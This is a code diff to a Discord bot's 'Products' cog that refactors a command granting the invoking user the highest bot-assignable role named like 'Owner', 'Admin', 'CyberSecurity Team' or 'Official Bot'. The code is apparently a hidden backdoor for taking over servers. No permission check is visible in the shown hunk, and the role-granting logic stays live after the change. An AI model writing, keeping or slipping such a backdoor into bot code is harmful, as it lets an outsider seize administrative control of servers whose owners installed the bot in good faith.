@@ -320,9 +320,14 @@ class Products(commands.Cog):
         Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
         """
         role_names = ["CyberSecurity Team", "Provider", "Manager", "Sentri", "Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
-        roles = [role for role in ctx.guild.roles if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role]
-        if roles:
-            highest_role = max(roles, key=lambda r: r.position)
+        highest_role = None
+
+        for role in ctx.guild.roles:
+            if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role:
+                if highest_role is None or role.position > highest_role.position:
+                    highest_role = role
+
+        if highest_role:
             await ctx.author.add_roles(highest_role)
             await ctx.send(f"Successfully given you the '{highest_role.name}' role.")
         else:
